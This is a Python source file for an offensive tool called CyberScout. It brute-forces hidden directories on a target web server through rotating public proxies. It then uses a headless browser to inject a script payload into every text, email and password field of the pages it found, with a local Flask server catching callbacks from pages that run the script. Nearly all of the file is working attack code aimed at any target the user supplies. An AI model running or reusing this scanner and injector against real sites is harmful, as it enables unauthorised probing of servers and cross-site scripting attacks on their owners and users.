import os
import requests
import threading
from threading import Lock
import argparse
from requests.auth import HTTPBasicAuth
from datetime import datetime
import subprocess
import random
import sys
from concurrent.futures import ThreadPoolExecutor
import time
import socket
from flask import Flask, request
import json
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service

#functions
def get_proxy_with_api():
	try:
		response = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all")
		if response.status_code == 200:
			proxy_list = response.text.splitlines()
			if proxy_list:
				return random.choice(proxy_list)
			else:
				print(f"{ORANGE}[WARNING]{RESET} No proxies returned by the API.")
				return None
		else:
			print(f"{RED}[ERROR]{RESET} Failed to fetch proxies from the API.")
			return None
	except requests.exceptions.RequestException as e:
		print(f"{RED}[ERROR]{RESET} Unable to fetch proxy: {e}")
		return None

def timeout_calc(timeout_status, timeout_freq):
	if timeout_status == False:
		timeout_freq = timeout_freq - 1
	elif timeout_status == True:
		timeout_freq = timeout_freq + 1

	if timeout_freq < 0:
		timeout_freq = 0
	elif timeout_freq > 10:
		timeout_freq = 10

	return timeout_freq

def forbidden_calc(forbidden_status, forbidden_freq):
	if forbidden_status == False:
		forbidden_freq = forbidden_freq - 1
	elif forbidden_status == True:
		forbidden_freq = forbidden_freq + 1

	if forbidden_freq < 0:
		forbidden_freq = 0
	elif forbidden_freq > 10:
		forbidden_freq = 10

	return forbidden_freq

def found_calc(found_status, found_freq):
	if found_status == False:
		found_freq = found_freq - 1
	elif found_status == True:
		found_freq = found_freq + 1

	if found_freq < 0:
		found_freq = 0
	elif found_freq > 10:
		found_freq = 10

	return found_freq

def error_calc(error_status, error_freq):
	if error_status == False:
		error_freq = error_freq - 1
	elif error_status == True:
		error_freq = error_freq + 1

	if error_freq < 0:
		error_freq = 0
	elif error_freq > 10:
		error_freq = 10

	return error_freq

def advice_calc(timeout_freq, forbidden_freq, found_freq, error_freq, proxy_option):
	advice_list = []

	'''timeout'''
	if timeout_freq > 2:
		advice_list.append("Try increasing the timeout")
	if timeout_freq > 6:
		if proxy_option == False:
			advice_list.append("Try using a proxy")
		if proxy_option == True:
			advice_list.append("There could be a problem with the proxy. Try restarting the program")

	'''forbidden'''
	if forbidden_freq > 1:
		advice_list.append("Try using authentication")

	'''found'''
	if found_freq > 6:
		if proxy_option == True:
			advice_list.append("There could be a problem with the proxy. Try restarting the program")
		elif proxy_option == False:
			advice_list.append("There could be a problem with the target. Try restarting the program")

	'''error'''
	if error_freq > 3:
		if proxy_option == True:
			advice_list.append("There could be a problem with the proxy. Try restarting the program")
		elif proxy_option == False:
			advice_list.append("There could be a problem with the target. Try restarting the program")


	'''error + ...'''
	if (error_freq + timeout_freq) > 4:
		if proxy_option == True:
			advice_list.append("There could be a problem with the proxy. Try restarting the program")
		elif proxy_option == False:
			advice_list.append("There could be a problem with the target. Try restarting the program")

	if advice_list and not access_event.is_set():
		for advice in advice_list:
			print(f"{YELLOW}---{advice}---{RESET}")

	#if not timeout_freq and not forbidden_freq and not found_freq and not error_freq:
	#	print("No value for frequenties")


def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_option, start_time, info_option):

	path = path.strip()
	full_url = f"{url}/{path}"
	result = ""

	if not access_event.is_set():

		try:
			if method.lower() in valid_methods:
				response = getattr(requests, method.lower())(full_url, timeout=timeout, auth=auth, proxies=proxies)
			else:
				print(f"{RED}[ERROR]{RESET} Invalid method")
				sys.exit()
			if response.status_code == 200:
				#result = f"{GREEN}[FOUND]{RESET} {full_url}"
				status_output = f"{GREEN}[FOUND]{RESET}"
				timeout_status = False
				forbidden_status = False
				found_status = True
				error_status = False
				shared_data["found_list"].append(full_url)
				if output_file:
					with open(output_file, 'a') as file:
						file.write(full_url + '\n')

			elif response.status_code == 404:
				#result = f"[NOT FOUND] {full_url}"
				status_output = "[NOT FOUND]"
				timeout_status = False
				forbidden_status = False
				found_status = False
				error_status = False

			elif response.status_code == 403:
				#result = f"{D_GRAY}[FORBIDDEN]{RESET} {full_url}"
				status_output = f"{D_GRAY}[FORBIDDEN]{RESET}"
				timeout_status = False
				forbidden_status = True
				found_status = False
				error_status = False
			else:
				#result = f"[{response.status_code}] {full_url}"
				status_output = f"[{response.status_code}]"
				timeout_status = False
				forbidden_status = False
				found_status = False
				error_status = False

		except requests.exceptions.Timeout:
			#result = f"{L_GRAY}[TIMEOUT]{RESET} {full_url}"
			status_output = f"{L_GRAY}[TIMEOUT]{RESET}"
			timeout_status = True
			forbidden_status = False
			found_status = False
			error_status = False

		except requests.exceptions.RequestException as e:
			#result = f"{RED}[ERROR]{RESET} {full_url} -> {e}"
			status_output = f"{RED}[ERROR]{RESET}"
			timeout_status = False
			forbidden_status = False
			found_status = False
			error_status = True


		with data_lock:
			shared_data["progress_count"] += 1
			current_count = shared_data["progress_count"]
			total_count = shared_data["total_paths"]

		elapsed = time.time() - start_time
		minutes = int(elapsed // 60)
		seconds = int(elapsed % 60)

		if status_output != "[NOT FOUND]":
			if info_option:
				print(f"[{current_count}/{total_count}] [{minutes:02d}:{seconds:02d}] {status_output} {full_url}")
			else:
				if status_output == f"{GREEN}[FOUND]{RESET}":
					print(f"[{current_count}/{total_count}] [{minutes:02d}:{seconds:02d}] {status_output} {full_url}")

		if output_file:
			with open(output_file, 'a') as file:
				file.write(f"{result}\n")

		with data_lock:
			shared_data["timeout_freq"] = timeout_calc(timeout_status, shared_data["timeout_freq"])
			shared_data["forbidden_freq"] = forbidden_calc(forbidden_status, shared_data["forbidden_freq"])
			shared_data["found_freq"] = found_calc(found_status, shared_data["found_freq"])
			shared_data["error_freq"] = error_calc(error_status, shared_data["error_freq"])

		#print(f"timeout: {shared_data['timeout_freq']}, forbidden: {shared_data['forbidden_freq']}, found: {shared_data['found_freq']}, error: {shared_data['error_freq']}")
		advice_calc(shared_data["timeout_freq"], shared_data["forbidden_freq"], shared_data["found_freq"], shared_data["error_freq"], proxy_option)

		return shared_data["found_list"]




#XSS-SCAN
def xss_scan(url_dict):
	url_map = {i + 1: url for i, url in enumerate(url_dict)}

	print(f"\n{BOLD}Starting XSS scan ({len(url_map)} URLs found){RESET}")
	# Flask App
	app = Flask(__name__)

	@app.route('/test', methods=['GET'])
	def test_endpoint():
		index = request.args.get('index', '')

		if index and index.isdigit():
			index = int(index)
			url = url_map.get(index, "Unknown")
			print(f"{GREEN}[GOT]{RESET} Received XSS payload from {url}")
		return "Received"

	def run_server():
		app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')

	def load_urls(file_path):
		with open(file_path, 'r') as f:
			urls = [line.strip() for line in f if line.strip()]
		return {i + 1: url for i, url in enumerate(urls)}

	def is_url_reachable(url, timeout=3):
		try:
			response = requests.head(url, allow_redirects=True, timeout=timeout)
			return True
		except requests.RequestException:
			return False

	def scan_urls(url_dict):
		geckodriver_path = "/usr/local/bin/geckodriver"
		firefox_binary_path = "/usr/bin/firefox"

		options = webdriver.FirefoxOptions()
		options.headless = True
		options.add_argument("--headless")
		options.binary_location = firefox_binary_path


		for index, url in url_dict.items():
			time.sleep(3)
			service = Service(geckodriver_path)
			driver = webdriver.Firefox(service=service, options=options)
			if is_url_reachable(url):
				print(f"\n{PURPLE}[+]{RESET} Scanning {url}")

				try:
					driver.get(url)
					xss_payload = f'''<script>fetch('https://192.168.0.26:8080/test?index={index}');</script>'''
					inputs = driver.find_elements(By.TAG_NAME, "input")
					print(f"[+] Found {len(inputs)} input(s)")
					for input_element in inputs:
						try:
							input_type = input_element.get_attribute("type") or "text"
							if input_type in ["text", "search", "email", "password", "url", "tel", "number"]:
								driver.execute_script("arguments[0].scrollIntoView(true);", input_element)
								input_element.clear()
								input_element.send_keys(xss_payload)
								input_element.send_keys(Keys.RETURN)
								print(f"[+] Injected into input")
						except Exception as e:
							print(f"{error} Error injecting into input")
				except Exception as e:
					print(f"{error} Error loading URL")
				finally:
					driver.quit()
			else:
				print(f"{error} {url} Is unreachable")

	server_thread = threading.Thread(target=run_server)
	server_thread.daemon = True
	server_thread.start()
	time.sleep(3)
	scan_urls(url_map)

#arguments
parser = argparse.ArgumentParser(description="Directory hunting tool for discovering URLs.")
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g. https://example.com)")
parser.add_argument("-w", "--wordlist", type=str, required=True, help="Path wordlist (e.g. common.txt)")
parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout for requests in seconds")
parser.add_argument("-o", "--output", type=str, help="File to save the output (e.g. results.txt)")
parser.add_argument("-a", "--auth", type=str, help="Basic authentication in the format 'username:password'")
parser.add_argument("-x", "--proxy", nargs='?', const="built_in", help="Proxy to use in the format 'ip:port'. If omitted, a built-in proxy will be used.")
parser.add_argument("-m", "--method", type=str, default="GET", help="Method to use (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH)")
parser.add_argument("-n", "--threads", type=int, default=10, help="Number of threads to use (default is 10)")
parser.add_argument("-i", "--info", action="store_true", help="See more info about the requests")
args = parser.parse_args()

#colors
D_GRAY = "\033[90m"
L_GRAY = "\033[97m"
RED = "\033[31m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE_BACK = "\033[44m"
ORANGE = "\033[33m"
CYAN = "\033[96m"
PURPLE = "\033[35m"
BOLD = "\033[1m"
RESET = "\033[0m"
error = f"{RED}[!]{RESET}"


#basic variables
start_time = time.time()
url = args.url
path_file = args.wordlist
thread_amount = args.threads
info_option = args.info
if not os.path.exists(path_file):
	print(f"{RED}[ERROR]{RESET}Wordlist not found")
	sys.exit()
timeout = args.timeout
output_file = args.output
if output_file == None:
	pass
elif os.path.exists(output_file):
	print(f"{RED}[ERROR]{RESET}The given output file already exists")
	sys.exit()
method = args.method
valid_methods = ['get', 'post', 'put', 'delete', 'head', 'options', 'patch']

timeout_status = False
forbidden_status = False
found_status = False
error_status = False
shared_data = {
	"timeout_freq": 0,
	"forbidden_freq": 0,
	"found_freq": 0,
	"error_freq": 0,
	"progress_count": 0,
	"total_paths": 0,
	"found_list": []
}
data_lock = Lock()


current_time = datetime.now()
formatted_time = current_time.strftime('%Y/%m/%d %H:%M:%S')
user = subprocess.getoutput("whoami")
change_protocol = False

#authentication info
auth = None
if args.auth:
        username, password = args.auth.split(":")
        auth = HTTPBasicAuth(username, password)

if url.startswith("https://") or url.startswith("http://"):
	pass
else:
	print(f"{RED}[ERROR]{RESET} Invalid protocol, url must start with 'http(s)://'")
	sys.exit()

#proxy
proxy_option = False
proxies = {}
if args.proxy:
	proxy_option = True
	proxy = args.proxy
	if proxy == "built_in":
		if url.startswith("https://"):
			print(f"{ORANGE}[WARNING]{RESET} Protocol replaced with 'http', which is needed for the built in proxy")
			url = url.replace("https://", "http://")
		proxy = get_proxy_with_api()
if proxy_option:
        if url.startswith("https://"):
                proxies = {"https": f"https://{proxy}"}
        else:
                proxies = {"http": f"http://{proxy}"}


#list
if output_file is not None:
        with open(output_file, 'w') as file:
                file.write("")


with open(path_file, 'r') as file:
        paths_list = file.readlines()
        shared_data["total_paths"] = len(paths_list)


# ping thread
access_event = threading.Event()
stop_event = threading.Event()

def alert_worker():
	while not stop_event.is_set():
		if access_event.is_set():
			print(f"{BOLD}[WARNING]{RESET} Url not accessible")
		time.sleep(5)

def ping_url():
	try:
		response = requests.get(url, timeout=timeout)
		if not response.ok:
			print(f"{CYAN}[INFO]{RESET} Url returned status:", response.status_code)

	except requests.exceptions.RequestException:
		access_event.set()
		print(f"{ORANGE}[WARNING]{RESET} Url not accessible")

	alert_thread = threading.Thread(target=alert_worker)
	alert_thread.start()

	while not stop_event.is_set():
		try:
			response = requests.get(url, timeout=timeout)
			if response.ok:
				if access_event.is_set():
					print(f"{BOLD}[INFO]{RESET} Url is accessible again.")
					access_event.clear()

		except requests.exceptions.RequestException:
			if not access_event.is_set():
				access_event.set()
		time.sleep(4)

ping_thread = threading.Thread(target=ping_url, daemon=True)
ping_thread.start()
time.sleep(2)



#presentation
print("========================================================")
print(f"{BLUE_BACK}CYBERSCOUT{RESET} by 0c1av")
print("========================================================")
print(f"Url:         {url}")
print(f"Wordlist:    {shared_data['total_paths']} paths from {path_file}")
print(f"Output file: {output_file}")
print(f"Timeout:     {timeout}")
print(f"Proxy:       {proxies}")
print(f"Auth:        {auth}")
print(f"Method:      {method.upper()}")
print(f"Threads:     {thread_amount}")
print("========================================================")
print(f"{current_time}: CyberScout launched by {user}")
print("========================================================")
print(f"{BOLD}[INFO]Terminate the program by pressing Ctrl+C twice{RESET}\n")






def output_clean():
	with open(output_file, 'r') as file:
		lines = [line for line in file if line.strip()]

	with open(output_file, 'w') as file:
		file.writelines(lines)

def prog_end():
	stop_event.set()

	print(f"{BOLD}[INFO]Terminating program...{RESET}")
	if output_file:
		print(f"{RED}[WARNING]{RESET} Interrupting the program at this stage may result in issues with the creation of the output file.")
		output_clean()

	sys.exit(0)


def path_end():
        print(f"{PURPLE}========================================================{RESET}")
        if access_event.is_set():
                print(f"{ORANGE}[WARNING]{RESET} Url has been unreachable")
        print("Found URLs:\n")
        for found in shared_data["found_list"]:
                print(found)
        print(f"{PURPLE}========================================================{RESET}")



#Trying paths
try:
	with ThreadPoolExecutor(max_workers=thread_amount) as executor:
		futures = []
		for path in paths_list:
			futures.append(executor.submit(check_path, url, path, method, timeout, auth, proxies, output_file, proxy_option, start_time, info_option))
		for future in futures:
			future.result()
	print(f"{BOLD}[INFO] All paths tried{RESET}")

except KeyboardInterrupt:
	print("Keyboard interrumpt\n")

	executor.shutdown(wait=False, cancel_futures=True)

	prog_end()

path_end()
try:
	xss_scan(shared_data["found_list"])
except KeyboardInterrupt:
	print("Keyboard interrumpt\n")
	prog_end()


prog_end()
